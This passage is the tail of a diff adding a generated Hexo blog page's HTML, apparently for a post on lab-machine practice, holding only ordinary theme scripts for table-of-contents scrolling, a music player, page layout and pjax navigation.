+    enableQQ: config.enableQQ,
+    path: '2026/03/20/靶机精炼-思路为王（二）/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello，欢迎你们来到博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">...</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
